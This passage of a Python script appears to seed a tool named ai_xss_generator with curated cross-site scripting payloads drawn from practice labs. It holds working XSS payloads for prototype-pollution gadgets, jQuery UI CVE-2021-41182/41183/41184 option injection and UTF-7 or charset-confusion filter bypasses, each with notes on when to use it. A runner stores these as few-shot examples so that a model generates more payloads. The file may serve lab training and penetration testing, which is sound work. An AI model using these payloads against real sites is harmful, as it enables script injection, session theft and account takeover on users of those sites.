        payload="?constructor[prototype][innerHTML]=<img src=x onerror=alert(1)>",
        test_vector=(
            "Alternative prototype pollution path via constructor.prototype. "
            "Use when __proto__ is blocked/sanitised but constructor.prototype is not."
        ),
        model="curated",
        explanation=(
            "constructor[prototype] is equivalent to __proto__ for setting inherited "
            "properties. Sanitisers that strip '__proto__' often miss this path. "
            "The polluted property propagates to all plain objects in the same way."
        ),
        tags=["prototype-pollution", "constructor-prototype", "expert", "xssy:1323"],
        verified=True,
    ),
    Finding(
        sink_type="prototype_gadget",
        context_type="prototype_pollution",
        surviving_chars="abcdefghijklmnopqrstuvwxyz_[]\"'{}.:=/",
        bypass_family="prototype-pollution",
        payload="?__proto__[srcdoc]=<script>alert(1)</script>",
        test_vector=(
            "Pollute srcdoc property. If code does: iframe.srcdoc = options.srcdoc, "
            "and options is a plain object without srcdoc, it inherits the polluted value."
        ),
        model="curated",
        explanation=(
            "srcdoc gadget: if an iframe element's srcdoc is set from a plain object "
            "property, prototype pollution of Object.prototype.srcdoc causes the iframe "
            "to load the attacker's HTML. The script inside srcdoc executes in the "
            "same origin context."
        ),
        tags=["prototype-pollution", "srcdoc-gadget", "expert", "xssy:1323"],
        verified=True,
    ),
    Finding(
        sink_type="prototype_gadget",
        context_type="prototype_pollution",
        surviving_chars="abcdefghijklmnopqrstuvwxyz_[]\"'{}.:=/",
        bypass_family="prototype-pollution",
        payload='{"__proto__": {"innerHTML": "<img src=x onerror=alert(1)>"}}',
        test_vector=(
            "Via JSON body if the server passes parsed JSON to a merge function: "
            "fetch('/api/settings', {method:'POST', body:'{\"__proto__\":{\"innerHTML\":\"<img src=x onerror=alert(1)>\"}}'}) "
            "The server merge pollutes the prototype, XSS fires in next render."
        ),
        model="curated",
        explanation=(
            "JSON-based prototype pollution: JSON.parse preserves __proto__ as a key. "
            "If the parsed object is merged with Object.assign or lodash _.merge without "
            "sanitisation, Object.prototype gets polluted. Useful when query-string "
            "prototype pollution is filtered but POST body is not."
        ),
        tags=["prototype-pollution", "json", "post-body", "expert", "xssy:1323"],
        verified=True,
    ),

    # ════════════════════════════════════════════════════════════════════════
    # Lab: jQuery UI <1.13.0 XSS  (id=174)
    # Technique: CVE-2021-41182 / 41183 / 41184 — option injection via HTML
    # ════════════════════════════════════════════════════════════════════════
    Finding(
        sink_type="jquery_ui_option",
        context_type="library_cve",
        surviving_chars="abcdefghijklmnopqrstuvwxyz<>\"'()=/{}",
        bypass_family="html-attribute-breakout",
        payload="<img src=x onerror=alert(1)>",
        test_vector=(
            "CVE-2021-41182: jQuery UI Datepicker altField option. "
            "Pass payload as altField: $('input').datepicker({altField: '<img src=x onerror=alert(1)>'}). "
            "If user controls the option value, jQuery UI inserts it as HTML."
        ),
        model="curated",
        explanation=(
            "jQuery UI Datepicker's altField option is passed to $(altField) which "
            "treats it as a jQuery selector/HTML. If it starts with '<', jQuery "
            "creates a DOM element from it directly. CVE-2021-41182. "
            "Fixed in jQuery UI 1.13.0 — check the loaded version."
        ),
        tags=["jquery-ui", "cve-2021-41182", "library-xss", "expert", "xssy:174"],
        verified=True,
    ),
    Finding(
        sink_type="jquery_ui_option",
        context_type="library_cve",
        surviving_chars="abcdefghijklmnopqrstuvwxyz<>\"'()=/{}",
        bypass_family="html-attribute-breakout",
        payload="<img src=x onerror=alert(1)>",
        test_vector=(
            "CVE-2021-41183: jQuery UI .position() — 'of' option. "
            "$('#element').position({of: '<img src=x onerror=alert(1)>'}). "
            "CVE-2021-41184: jQuery UI .checkboxradio() — 'icon' option label."
        ),
        model="curated",
        explanation=(
            "Multiple jQuery UI widgets pass option values through $() which "
            "interprets HTML strings as DOM creation. Affected: .position(of:), "
            ".datepicker(altField:), .dialog(appendTo:), .tooltip(content:) when "
            "content option is set to a raw HTML string from user input. "
            "All fixed in jQuery UI 1.13.0."
        ),
        tags=["jquery-ui", "cve-2021-41183", "cve-2021-41184", "library-xss", "expert", "xssy:174"],
        verified=True,
    ),

    # ════════════════════════════════════════════════════════════════════════
    # Lab: Charsets  (id=1645)
    # Technique: character set manipulation / UTF-7 / charset confusion XSS
    # ════════════════════════════════════════════════════════════════════════
    Finding(
        sink_type="innerHTML",
        context_type="charset_confusion",
        surviving_chars="+ADw-ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-",
        bypass_family="unicode-fullwidth",
        payload="+ADw-script+AD4-alert(1)+ADw-/script+AD4-",
        test_vector=(
            "UTF-7 XSS: inject when page is served without charset declaration "
            "or when you can inject <meta charset='utf-7'>. "
            "+ADw- is '<', +AD4- is '>' in UTF-7 modified base64. "
            "Works in IE without X-Content-Type-Options."
        ),
        model="curated",
        explanation=(
            "UTF-7 encodes non-ASCII chars as +Bxx-. +ADw- = < and +AD4- = >. "
            "If the browser is tricked into interpreting the page as UTF-7 "
            "(via missing charset, meta injection, or IE's auto-detection), "
            "these sequences decode to <script>alert(1)</script> and execute."
        ),
        tags=["charset", "utf-7", "expert", "xssy:1645"],
        verified=True,
    ),
    Finding(
        sink_type="innerHTML",
        context_type="charset_confusion",
        surviving_chars="abcdefghijklmnopqrstuvwxyz<>\"'=/",
        bypass_family="unicode-fullwidth",
        payload='<meta charset="utf-7">+ADw-script+AD4-alert(1)+ADw-/script+AD4-',
        test_vector=(
            "Inject early in the page. The <meta charset='utf-7'> tag changes "
            "how the browser interprets subsequent content. The UTF-7 payload "
            "that follows is then decoded and executed."
        ),
        model="curated",
        explanation=(
            "Meta charset injection: if you can inject HTML before the existing "
            "<meta charset> tag (or if none exists), setting charset to UTF-7 "
            "causes the browser to decode all subsequent +Bxx- sequences as UTF-7. "
            "The payload after the meta tag decodes to <script>alert(1)</script>."
        ),
        tags=["charset", "utf-7", "meta-injection", "expert", "xssy:1645"],
        verified=True,
    ),
    Finding(
        sink_type="innerHTML",
        context_type="charset_confusion",
        surviving_chars="abcdefghijklmnopqrstuvwxyz\xc0\xbc<>\"'=/",
        bypass_family="double-url-encoding",
        payload="\xc0\xbcscript\xc0\xbealert(1)\xc0\xbc/script\xc0\xbe",
        test_vector=(
            "Latin-1 / ISO-8859-1 charset confusion. If page is served as ISO-8859-1 "
            "but filter decodes as UTF-8, the byte 0xC0 0xBC is a valid 2-char Latin-1 "
            "sequence but looks like an overlong UTF-8 '<'. Decoder mismatch."
        ),
        model="curated",
        explanation=(
            "Charset mismatch attack: the security filter decodes the input as UTF-8 "
            "and sees non-parseable overlong sequences (safe). The browser renders the "
            "page as ISO-8859-1 (as declared) and sees the raw bytes 0xC0 0xBC as two "
            "characters — but some parsers map 0xBC to '<' in certain charset mappings."
        ),
        tags=["charset", "latin-1", "charset-mismatch", "expert", "xssy:1645"],
        verified=True,
    ),
]


# ---------------------------------------------------------------------------
# Seed runner (same as adept seeder)
# ---------------------------------------------------------------------------

def _count_partition(context_type: str) -> int:
    from ai_xss_generator.findings import _partition_path
    path = _partition_path(context_type)
    if not path.exists():
        return 0
    return sum(1 for l in path.read_text(encoding="utf-8").splitlines() if l.strip())


def main() -> int:
    header("\n=== axss-learn: seeding Expert lab knowledge ===\n")
    info(f"Writing {len(EXPERT_FINDINGS)} curated findings to ~/.axss/findings/")
    print()

    saved = 0
    skipped = 0
    for f in EXPERT_FINDINGS:
        try:
            before = _count_partition(f.context_type)
            save_finding(f)
            after = _count_partition(f.context_type)
            if after > before:
                saved += 1
                info(f"  + [{f.bypass_family:<28}]  {f.payload[:60]}")
            else:
                skipped += 1
        except Exception as exc:
            warn(f"  ! Failed: {exc}")

    print()
    success(f"Done. {saved} new findings saved, {skipped} already existed.")
    info(
        "Run 'python axss_learn.py --min-rating 34 --max-rating 34' to now "
        "generate payloads with these as few-shot examples."
    )
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
